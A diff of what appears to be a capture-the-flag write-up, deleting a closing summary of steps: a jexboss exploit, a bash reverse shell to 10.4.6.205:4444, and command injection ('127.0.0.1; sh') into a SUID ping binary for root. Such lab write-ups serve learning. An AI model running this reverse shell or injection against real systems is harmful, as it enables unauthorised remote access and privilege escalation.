@@ -175,30 +175,3 @@ We've successfully escalated our privileges!
 We can now obtain **root.txt** from /root:
 
 <img style="float: left;" src="screenshots/screenshot11.png">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-1. use jexboss with any vulnerability
-2. Open reverse shell
-
-```
-bash -i >& /dev/tcp/10.4.6.205/4444 0>&1
-```
-
-3. Upgrade to interactive shell
-4. find suid-bit set files: pingsys
-5. use strings on file
-6. Notice that user input is directly appended to 'ping' command
-7. Simple input '127.0.0.1; sh'
